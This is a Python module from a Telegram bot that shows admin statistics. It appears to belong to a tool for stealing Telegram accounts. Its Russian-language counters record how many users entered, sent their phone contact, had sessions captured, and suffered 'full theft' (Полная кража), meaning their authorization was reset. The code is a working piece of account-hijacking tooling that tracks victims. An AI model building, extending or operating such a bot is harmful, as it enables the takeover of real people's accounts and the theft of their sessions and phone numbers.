from tgbot.dialogs.dialog import dialog, migrate
from tgbot.keyboards.keyboard import keyboard
from tgbot.services.get_text import gText
from tgbot.services.Session import ImportSession

from tgbot.states.State import State


async def statistic(message, state, repo, edit):
	title = '📈 Статистика'
	s = {'all': 0, 'sessions': 0, 'still': 0, 'phone': 0}
	for i in repo.storage.keys():
		s['all'] += 1
		user = repo.storage[i]
		if user['session']:
			s['sessions'] += 1
		if user['reset_auth']:
			s['still'] += 1
		if user['phone']:
			s['phone'] += 1
	text = [
		f'👤 Зашло пользователей: <b>{s["all"]}</>',
		f'📲 Отправили контакт: <b>{s["phone"]}</>',
		f'⏳ Получено сессий: <b>{s["sessions"]}</>',
		f'✅ Полная кража: <b>{s["still"]}</>',
	]
	markup = await keyboard.admin.back_to_menu()
	await dialog(message, edit=edit, text=text, markup=markup, title=title)



async def dialog_admin_statistic(state, message, current_state, repo, edit: bool=True):
	if current_state == State.admin.statistic.state:
		await statistic(message, state, repo, edit)